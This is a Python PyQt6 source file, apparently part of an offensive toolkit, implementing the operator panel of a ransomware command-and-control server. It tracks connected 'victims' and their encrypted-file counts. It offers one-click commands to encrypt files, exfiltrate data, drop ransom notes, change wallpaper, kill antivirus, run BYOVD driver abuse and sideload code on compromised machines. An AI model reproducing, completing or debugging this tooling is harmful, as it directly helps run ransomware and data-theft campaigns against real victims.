# widgets/c2_dialog.py

"""
C2 Server Dialog - Complete Command & Control Server
Fitur: Multi-session, Command Sending, Web Panel, Victim Management
FIXED: Command sending with debug, better error handling
"""

from PyQt6.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QTextEdit, QGroupBox, QFormLayout,
    QMessageBox, QWidget, QTabWidget, QSplitter,
    QListWidget, QListWidgetItem, QTableWidget, QTableWidgetItem,
    QHeaderView, QComboBox, QSpinBox, QCheckBox,
    QFileDialog, QApplication, QProgressBar,
    QMenu, QScrollArea, QFrame
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer, QUrl
from PyQt6.QtGui import QFont, QColor, QTextCursor, QAction, QIcon, QDesktopServices

import json
import threading
import socket
import time
import os
import subprocess
import base64
from datetime import datetime
from pathlib import Path


class C2ServerThread(QThread):
    """Worker thread untuk C2 Server"""
    output = pyqtSignal(str)
    status = pyqtSignal(str)
    victim_connected = pyqtSignal(dict)
    victim_disconnected = pyqtSignal(str)
    victim_updated = pyqtSignal(dict)
    command_response = pyqtSignal(str, str)

    def __init__(self, host, port, web_port, password):
        super().__init__()
        self.host = host
        self.port = port
        self.web_port = web_port
        self.password = password
        self.server = None
        self.running = False
        self.victims = {}
        self.victim_id_counter = 0
        self.lock = threading.Lock()

    def run(self):
        try:
            from modules.payload.c2_server import C2Server
            self.server = C2Server(self.host, self.port, self.web_port, self.password)
            self.running = True
            self.status.emit("running")
            self.output.emit(f"[*] C2 Server started on {self.host}:{self.port}")
            self.output.emit(f"[*] Web panel: http://{self.host}:{self.web_port}")
            self.output.emit(f"[*] Password: {self.password}")
            self.output.emit("[*] Waiting for victims...")
            self.server.start()
        except Exception as e:
            self.output.emit(f"[!] Error: {e}")
            self.status.emit("error")

    def stop(self):
        self.running = False
        if self.server:
            self.server.stop()
        self.status.emit("stopped")
        self.output.emit("[*] C2 Server stopped")

    def send_command(self, victim_id, command):
        """Send command to victim - FIXED with debug"""
        if not self.server:
            print("[DEBUG] C2ServerThread: Server not running")
            return False, "Server not running"
        try:
            print(f"[DEBUG] C2ServerThread: Sending {command} to {victim_id}")
            success, message = self.server.send_command(victim_id, command)
            if success:
                self.command_response.emit(victim_id, f"[+] Command sent: {command}")
            else:
                self.command_response.emit(victim_id, f"[!] Failed: {message}")
            print(f"[DEBUG] C2ServerThread: Result = {success}, {message}")
            return success, message
        except Exception as e:
            print(f"[DEBUG] C2ServerThread: Error = {e}")
            return False, str(e)

    def get_victims(self):
        with self.lock:
            return dict(self.victims)


class C2Dialog(QDialog):
    """Dialog untuk C2 Server - Complete Control Panel"""

    def __init__(self, framework=None, parent=None):
        super().__init__(parent)
        self.framework = framework
        self.setWindowTitle("☠ C2 Server - Command & Control")
        self.setModal(False)
        self.setMinimumSize(1200, 800)

        self.server_thread = None
        self.victims = {}
        self.selected_victim = None
        self.command_history = []
        self._build_ui()
        self._apply_defaults()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(6)
        layout.setContentsMargins(8, 8, 8, 8)

        # ── Title Bar ──
        title_widget = QWidget()
        title_widget.setFixedHeight(50)
        title_widget.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #0a0a0a, stop:0.3 #1a0a0a, stop:0.7 #0a1a0a, stop:1 #0a0a0a);
                border-radius: 4px;
            }
        """)
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(15, 5, 15, 5)

        title = QLabel("☠ C2 SERVER v2.0")
        title.setStyleSheet("color: #ff0000; font-size: 18pt; font-weight: bold;")
        title_layout.addWidget(title)
        
        title_layout.addStretch()
        
        self.status_indicator = QLabel("● Stopped")
        self.status_indicator.setStyleSheet("color: #ff5555; font-size: 12pt; font-weight: bold;")
        title_layout.addWidget(self.status_indicator)

        self.victim_count_label = QLabel("Victims: 0")
        self.victim_count_label.setStyleSheet("color: #00ff00; font-size: 12pt; font-weight: bold;")
        title_layout.addWidget(self.victim_count_label)

        layout.addWidget(title_widget)

        # ── Main Split ──
        main_split = QSplitter(Qt.Orientation.Horizontal)
        main_split.setSizes([350, 450, 400])

        left_panel = self._build_victim_panel()
        main_split.addWidget(left_panel)

        center_panel = self._build_console_panel()
        main_split.addWidget(center_panel)

        right_panel = self._build_command_panel()
        main_split.addWidget(right_panel)

        layout.addWidget(main_split)

        # ── Control Buttons ──
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(6)

        self.start_btn = QPushButton("▶ Start Server")
        self.start_btn.setMinimumHeight(40)
        self.start_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                font-weight: bold;
                font-size: 12pt;
                padding: 8px 24px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #2ea043; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.start_btn.clicked.connect(self._start_server)
        btn_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("⏹ Stop Server")
        self.stop_btn.setMinimumHeight(40)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background: #da3633;
                color: white;
                font-weight: bold;
                font-size: 12pt;
                padding: 8px 24px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #f85149; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.stop_btn.clicked.connect(self._stop_server)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)

        btn_layout.addStretch()

        self.web_btn = QPushButton("🌐 Open Web Panel")
        self.web_btn.setMinimumHeight(40)
        self.web_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                font-size: 12pt;
                padding: 8px 24px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #388bfd; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.web_btn.clicked.connect(self._open_web_panel)
        self.web_btn.setEnabled(False)
        btn_layout.addWidget(self.web_btn)

        self.clear_btn = QPushButton("🗑 Clear Console")
        self.clear_btn.setMinimumHeight(40)
        self.clear_btn.setStyleSheet("""
            QPushButton {
                background: #555555;
                color: white;
                font-weight: bold;
                font-size: 12pt;
                padding: 8px 16px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #777777; }
        """)
        self.clear_btn.clicked.connect(self._clear_console)
        btn_layout.addWidget(self.clear_btn)

        layout.addLayout(btn_layout)

    def _build_victim_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(4, 4, 4, 4)

        header = QLabel("🎯 Victims")
        header.setStyleSheet("font-weight: bold; color: #00ff00; font-size: 12pt; padding: 4px;")
        layout.addWidget(header)

        self.victim_list = QListWidget()
        self.victim_list.setStyleSheet("""
            QListWidget {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QListWidget::item {
                padding: 8px 12px;
                border-bottom: 1px solid #1a1a1a;
            }
            QListWidget::item:selected {
                background: #1f6feb;
                color: #ffffff;
            }
            QListWidget::item:hover {
                background: #2a2a2e;
            }
        """)
        self.victim_list.itemClicked.connect(self._on_victim_selected)
        self.victim_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.victim_list.customContextMenuRequested.connect(self._show_victim_context_menu)
        layout.addWidget(self.victim_list)

        stats_widget = QWidget()
        stats_widget.setStyleSheet("background: #0a0a0a; border-radius: 4px; padding: 4px;")
        stats_layout = QHBoxLayout(stats_widget)
        stats_layout.setContentsMargins(8, 4, 8, 4)

        self.online_label = QLabel("🟢 Online: 0")
        self.online_label.setStyleSheet("color: #00ff00; font-size: 10pt;")
        stats_layout.addWidget(self.online_label)

        self.offline_label = QLabel("🔴 Offline: 0")
        self.offline_label.setStyleSheet("color: #ff5555; font-size: 10pt;")
        stats_layout.addWidget(self.offline_label)

        self.encrypted_label = QLabel("🔓 Encrypted: 0")
        self.encrypted_label.setStyleSheet("color: #ffaa00; font-size: 10pt;")
        stats_layout.addWidget(self.encrypted_label)

        stats_layout.addStretch()
        layout.addWidget(stats_widget)

        return panel

    def _build_console_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(4, 4, 4, 4)

        header = QLabel("📟 Console")
        header.setStyleSheet("font-weight: bold; color: #00ffff; font-size: 12pt; padding: 4px;")
        layout.addWidget(header)

        self.console_output = QTextEdit()
        self.console_output.setReadOnly(True)
        self.console_output.setFont(QFont("Consolas", 10))
        self.console_output.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
        """)
        layout.addWidget(self.console_output)

        return panel

    def _build_command_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(4, 4, 4, 4)

        # ── Victim Info ──
        info_group = QGroupBox("ℹ️ Victim Info")
        info_group.setStyleSheet("""
            QGroupBox {
                color: #00ff00;
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 8px;
                padding-top: 12px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 8px;
                color: #00ff00;
            }
        """)
        info_layout = QVBoxLayout()
        info_layout.setSpacing(4)

        self.victim_info = QTextEdit()
        self.victim_info.setReadOnly(True)
        self.victim_info.setMaximumHeight(120)
        self.victim_info.setFont(QFont("Consolas", 9))
        self.victim_info.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 4px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
        """)
        self.victim_info.setPlainText("Select a victim to view info")
        info_layout.addWidget(self.victim_info)

        info_group.setLayout(info_layout)
        layout.addWidget(info_group)

        # ── Command Sender ──
        cmd_group = QGroupBox("📤 Send Command")
        cmd_group.setStyleSheet("""
            QGroupBox {
                color: #ffaa00;
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 8px;
                padding-top: 12px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 8px;
                color: #ffaa00;
            }
        """)
        cmd_layout = QVBoxLayout()
        cmd_layout.setSpacing(4)

        quick_layout = QHBoxLayout()
        quick_layout.setSpacing(4)

        quick_commands = [
            ("🔓 Encrypt", "encrypt"),
            ("🔓 Decrypt", "decrypt"),
            ("📊 Status", "status"),
            ("📤 Exfil", "exfiltrate"),
            ("🖼️ Wallpaper", "wallpaper"),
            ("📝 Note", "note"),
            ("🖼️ Icon", "icon"),
            ("☠ Kill", "kill"),
        ]

        for label, cmd in quick_commands:
            btn = QPushButton(label)
            btn.setFixedHeight(28)
            btn.setStyleSheet("""
                QPushButton {
                    background: #2d2d2d;
                    color: #cccccc;
                    border: 1px solid #3c3c3c;
                    border-radius: 3px;
                    font-size: 9pt;
                    padding: 2px 8px;
                }
                QPushButton:hover {
                    background: #3a3a3a;
                    color: #ffffff;
                }
            """)
            btn.clicked.connect(lambda checked, c=cmd: self._send_quick_command(c))
            quick_layout.addWidget(btn)

        cmd_layout.addLayout(quick_layout)

        custom_layout = QHBoxLayout()
        custom_layout.setSpacing(4)

        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Custom command...")
        self.cmd_input.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 6px 10px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QLineEdit:focus {
                border-color: #007acc;
            }
        """)
        self.cmd_input.returnPressed.connect(self._send_custom_command)
        custom_layout.addWidget(self.cmd_input, 2)

        self.send_btn = QPushButton("Send")
        self.send_btn.setFixedHeight(32)
        self.send_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
                padding: 4px 16px;
            }
            QPushButton:hover { background: #388bfd; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.send_btn.clicked.connect(self._send_custom_command)
        custom_layout.addWidget(self.send_btn)

        cmd_layout.addLayout(custom_layout)

        av_layout = QHBoxLayout()
        av_layout.setSpacing(4)

        self.avkill_btn = QPushButton("☠ KILL AV")
        self.avkill_btn.setFixedHeight(30)
        self.avkill_btn.setStyleSheet("""
            QPushButton {
                background: #ff0000;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
                padding: 4px 16px;
                font-size: 10pt;
            }
            QPushButton:hover { background: #cc0000; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.avkill_btn.clicked.connect(lambda: self._send_quick_command("avkill"))
        av_layout.addWidget(self.avkill_btn)

        self.byovd_btn = QPushButton("🔓 BYOVD")
        self.byovd_btn.setFixedHeight(30)
        self.byovd_btn.setStyleSheet("""
            QPushButton {
                background: #ff6600;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
                padding: 4px 16px;
                font-size: 10pt;
            }
            QPushButton:hover { background: #cc5500; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.byovd_btn.clicked.connect(lambda: self._send_quick_command("byovd"))
        av_layout.addWidget(self.byovd_btn)

        self.sideload_btn = QPushButton("📦 Sideload")
        self.sideload_btn.setFixedHeight(30)
        self.sideload_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
                padding: 4px 16px;
                font-size: 10pt;
            }
            QPushButton:hover { background: #388bfd; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.sideload_btn.clicked.connect(lambda: self._send_quick_command("sideload"))
        av_layout.addWidget(self.sideload_btn)

        av_layout.addStretch()
        cmd_layout.addLayout(av_layout)

        cmd_group.setLayout(cmd_layout)
        layout.addWidget(cmd_group)

        # ── Command History ──
        history_group = QGroupBox("📜 Command History")
        history_group.setStyleSheet("""
            QGroupBox {
                color: #ff79c6;
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 8px;
                padding-top: 12px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 8px;
                color: #ff79c6;
            }
        """)
        history_layout = QVBoxLayout()
        history_layout.setSpacing(2)

        self.history_list = QListWidget()
        self.history_list.setStyleSheet("""
            QListWidget {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
                max-height: 120px;
            }
            QListWidget::item {
                padding: 4px 8px;
                border-bottom: 1px solid #1a1a1a;
            }
        """)
        history_layout.addWidget(self.history_list)

        history_group.setLayout(history_layout)
        layout.addWidget(history_group)

        layout.addStretch()
        return panel

    def _apply_defaults(self):
        pass

    def _start_server(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Start C2 Server")
        dialog.setModal(True)
        dialog.setFixedSize(400, 300)
        
        layout = QVBoxLayout(dialog)
        
        form = QFormLayout()
        
        host_input = QLineEdit("0.0.0.0")
        host_input.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 6px 10px;
                font-family: 'Consolas', monospace;
            }
        """)
        form.addRow("Host:", host_input)
        
        port_input = QLineEdit("4444")
        port_input.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 6px 10px;
                font-family: 'Consolas', monospace;
            }
        """)
        form.addRow("Port:", port_input)
        
        web_port_input = QLineEdit("5000")
        web_port_input.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 6px 10px;
                font-family: 'Consolas', monospace;
            }
        """)
        form.addRow("Web Port:", web_port_input)
        
        password_input = QLineEdit("admin")
        password_input.setEchoMode(QLineEdit.EchoMode.Password)
        password_input.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 6px 10px;
                font-family: 'Consolas', monospace;
            }
        """)
        form.addRow("Password:", password_input)
        
        layout.addLayout(form)
        
        btn_layout = QHBoxLayout()
        start_btn = QPushButton("Start")
        start_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                font-weight: bold;
                padding: 8px 24px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #2ea043; }
        """)
        start_btn.clicked.connect(dialog.accept)
        btn_layout.addWidget(start_btn)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet("""
            QPushButton {
                background: #555555;
                color: white;
                font-weight: bold;
                padding: 8px 24px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #777777; }
        """)
        cancel_btn.clicked.connect(dialog.reject)
        btn_layout.addWidget(cancel_btn)
        
        layout.addLayout(btn_layout)
        
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return
        
        host = host_input.text().strip()
        port = int(port_input.text().strip())
        web_port = int(web_port_input.text().strip())
        password = password_input.text().strip()
        
        if not host or not port or not web_port:
            QMessageBox.warning(self, "Error", "Please fill all fields")
            return
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.web_btn.setEnabled(True)
        self.status_indicator.setText("● Running")
        self.status_indicator.setStyleSheet("color: #00ff00; font-size: 12pt; font-weight: bold;")
        self.console_output.clear()
        self._append_output("[*] Starting C2 Server...")
        
        self.server_thread = C2ServerThread(host, port, web_port, password)
        self.server_thread.output.connect(self._append_output)
        self.server_thread.status.connect(self._on_server_status)
        self.server_thread.victim_connected.connect(self._on_victim_connected)
        self.server_thread.victim_disconnected.connect(self._on_victim_disconnected)
        self.server_thread.command_response.connect(self._on_command_response)
        self.server_thread.start()

    def _stop_server(self):
        if self.server_thread:
            self.server_thread.stop()
            self.server_thread.wait()
            self.server_thread = None
        
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.web_btn.setEnabled(False)
        self.status_indicator.setText("● Stopped")
        self.status_indicator.setStyleSheet("color: #ff5555; font-size: 12pt; font-weight: bold;")
        self._append_output("[*] C2 Server stopped")

    def _on_server_status(self, status):
        if status == "running":
            self.status_indicator.setText("● Running")
            self.status_indicator.setStyleSheet("color: #00ff00; font-size: 12pt; font-weight: bold;")
        elif status == "stopped":
            self.status_indicator.setText("● Stopped")
            self.status_indicator.setStyleSheet("color: #ff5555; font-size: 12pt; font-weight: bold;")
        elif status == "error":
            self.status_indicator.setText("● Error")
            self.status_indicator.setStyleSheet("color: #ff0000; font-size: 12pt; font-weight: bold;")

    def _on_victim_connected(self, victim_data):
        victim_id = victim_data['id']
        ip = victim_data['ip']
        port = victim_data['port']
        
        item = QListWidgetItem(f"🎯 {victim_id} ({ip}:{port})")
        item.setData(Qt.ItemDataRole.UserRole, victim_id)
        self.victim_list.addItem(item)
        
        self.victims[victim_id] = victim_data
        self.victims[victim_id]['status'] = 'online'
        self.victims[victim_id]['connected_at'] = datetime.now().isoformat()
        
        self._update_stats()
        self._append_output(f"[+] Victim connected: {victim_id} from {ip}:{port}")

    def _on_victim_disconnected(self, victim_id):
        if victim_id in self.victims:
            self.victims[victim_id]['status'] = 'offline'
            self._update_stats()
            self._append_output(f"[-] Victim disconnected: {victim_id}")
            
            for i in range(self.victim_list.count()):
                item = self.victim_list.item(i)
                if item.data(Qt.ItemDataRole.UserRole) == victim_id:
                    item.setText(f"🔴 {victim_id} (Offline)")
                    break

    def _on_command_response(self, victim_id, response):
        self._append_output(f"[{victim_id}] {response}")

    def _update_stats(self):
        online = sum(1 for v in self.victims.values() if v.get('status') == 'online')
        offline = len(self.victims) - online
        encrypted = sum(1 for v in self.victims.values() if v.get('encrypted', False))
        
        self.victim_count_label.setText(f"Victims: {len(self.victims)}")
        self.online_label.setText(f"🟢 Online: {online}")
        self.offline_label.setText(f"🔴 Offline: {offline}")
        self.encrypted_label.setText(f"🔓 Encrypted: {encrypted}")

    def _on_victim_selected(self, item):
        victim_id = item.data(Qt.ItemDataRole.UserRole)
        self.selected_victim = victim_id
        
        if victim_id in self.victims:
            data = self.victims[victim_id]
            info = f"""
ID: {victim_id}
IP: {data.get('ip', 'unknown')}
Port: {data.get('port', 'unknown')}
Status: {data.get('status', 'unknown')}
OS: {data.get('os', 'unknown')}
Hostname: {data.get('hostname', 'unknown')}
User: {data.get('user', 'unknown')}
Admin: {data.get('is_admin', False)}
Encrypted: {data.get('encrypted', False)}
Files Encrypted: {data.get('encrypted_count', 0)}
Connected: {data.get('connected_at', 'unknown')}
"""
            self.victim_info.setPlainText(info.strip())

    def _append_output(self, text):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console_output.append(f"[{timestamp}] {text}")
        cursor = self.console_output.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        self.console_output.setTextCursor(cursor)

    def _clear_console(self):
        self.console_output.clear()

    # ==================== FIXED: SEND QUICK COMMAND ====================
    def _send_quick_command(self, command):
        """Send quick command to selected victim - FIXED with debug"""
        if not self.selected_victim:
            QMessageBox.warning(self, "Error", "Please select a victim first")
            return
        
        if not self.server_thread or not self.server_thread.running:
            QMessageBox.warning(self, "Error", "Server is not running")
            return
        
        cmd_payload = {"type": command}
        self.history_list.addItem(f"[{self.selected_victim}] {command}")
        self.history_list.scrollToBottom()
        self._append_output(f"[*] Sending '{command}' to {self.selected_victim}")
        
        # Debug
        print(f"[DEBUG] C2Dialog: Sending {cmd_payload} to {self.selected_victim}")
        
        success, message = self.server_thread.send_command(self.selected_victim, cmd_payload)
        
        print(f"[DEBUG] C2Dialog: Result = {success}, {message}")
        
        if success:
            self._append_output(f"[+] Command sent to {self.selected_victim}")
        else:
            self._append_output(f"[!] Failed: {message}")
            QMessageBox.warning(self, "Command Failed", f"Failed to send command:\n{message}")

    # ==================== FIXED: SEND CUSTOM COMMAND ====================
    def _send_custom_command(self):
        """Send custom command to selected victim - FIXED with debug"""
        if not self.selected_victim:
            QMessageBox.warning(self, "Error", "Please select a victim first")
            return
        
        if not self.server_thread or not self.server_thread.running:
            QMessageBox.warning(self, "Error", "Server is not running")
            return
        
        cmd = self.cmd_input.text().strip()
        if not cmd:
            return
        
        try:
            if cmd.startswith('{'):
                cmd_payload = json.loads(cmd)
            else:
                cmd_payload = {"type": cmd}
        except:
            cmd_payload = {"type": cmd}
        
        self.history_list.addItem(f"[{self.selected_victim}] {cmd}")
        self.history_list.scrollToBottom()
        self.cmd_input.clear()
        self._append_output(f"[*] Sending custom command to {self.selected_victim}")
        
        # Debug
        print(f"[DEBUG] C2Dialog: Sending custom {cmd_payload} to {self.selected_victim}")
        
        success, message = self.server_thread.send_command(self.selected_victim, cmd_payload)
        
        print(f"[DEBUG] C2Dialog: Result = {success}, {message}")
        
        if success:
            self._append_output(f"[+] Command sent to {self.selected_victim}")
        else:
            self._append_output(f"[!] Failed: {message}")
            QMessageBox.warning(self, "Command Failed", f"Failed to send command:\n{message}")

    def _show_victim_context_menu(self, position):
        item = self.victim_list.itemAt(position)
        if not item:
            return
        
        victim_id = item.data(Qt.ItemDataRole.UserRole)
        
        menu = QMenu(self)
        menu.setStyleSheet("""
            QMenu {
                background: #1e1e1e;
                color: #cccccc;
                border: 1px solid #3c3c3c;
                padding: 4px;
            }
            QMenu::item {
                padding: 6px 24px;
                border-radius: 3px;
            }
            QMenu::item:selected {
                background: #007acc;
                color: white;
            }
            QMenu::separator {
                height: 1px;
                background: #3c3c3c;
                margin: 4px 8px;
            }
        """)
        
        commands = [
            ("🔓 Encrypt", "encrypt"),
            ("🔓 Decrypt", "decrypt"),
            ("📊 Status", "status"),
            ("📤 Exfiltrate", "exfiltrate"),
            ("🖼️ Wallpaper", "wallpaper"),
            ("📝 Note", "note"),
            ("🖼️ Icon", "icon"),
            ("☠ Kill", "kill"),
            ("", ""),
            ("☠ Kill AV", "avkill"),
            ("🔓 BYOVD", "byovd"),
            ("📦 Sideload", "sideload"),
            ("", ""),
            ("📋 Copy ID", "copy_id"),
            ("📋 Copy IP", "copy_ip"),
        ]
        
        for label, cmd in commands:
            if not label and not cmd:
                menu.addSeparator()
            else:
                action = QAction(label, menu)
                if cmd.startswith("copy_"):
                    action.triggered.connect(lambda checked, c=cmd, vid=victim_id: self._copy_victim_info(c, vid))
                else:
                    action.triggered.connect(lambda checked, c=cmd, vid=victim_id: self._send_command_to_victim(vid, c))
                menu.addAction(action)
        
        menu.exec(self.victim_list.viewport().mapToGlobal(position))

    def _send_command_to_victim(self, victim_id, command):
        """Send command to victim from context menu - FIXED"""
        if not self.server_thread or not self.server_thread.running:
            QMessageBox.warning(self, "Error", "Server is not running")
            return
        
        cmd_payload = {"type": command}
        self._append_output(f"[*] Sending '{command}' to {victim_id}")
        
        print(f"[DEBUG] C2Dialog(context): Sending {cmd_payload} to {victim_id}")
        
        success, message = self.server_thread.send_command(victim_id, cmd_payload)
        
        print(f"[DEBUG] C2Dialog(context): Result = {success}, {message}")
        
        if success:
            self._append_output(f"[+] Command sent to {victim_id}")
        else:
            self._append_output(f"[!] Failed: {message}")

    def _copy_victim_info(self, command, victim_id):
        if victim_id in self.victims:
            data = self.victims[victim_id]
            if command == "copy_id":
                text = victim_id
            elif command == "copy_ip":
                text = f"{data.get('ip', 'unknown')}:{data.get('port', 'unknown')}"
            else:
                text = str(data)
            
            QApplication.clipboard().setText(text)
            self._append_output(f"[+] Copied to clipboard: {text}")

    def _open_web_panel(self):
        if self.server_thread:
            host = self.server_thread.host
            web_port = self.server_thread.web_port
            url = f"http://{host}:{web_port}"
            QDesktopServices.openUrl(QUrl(url))
            self._append_output(f"[*] Opening web panel: {url}")

    def closeEvent(self, event):
        self._stop_server()
        event.accept()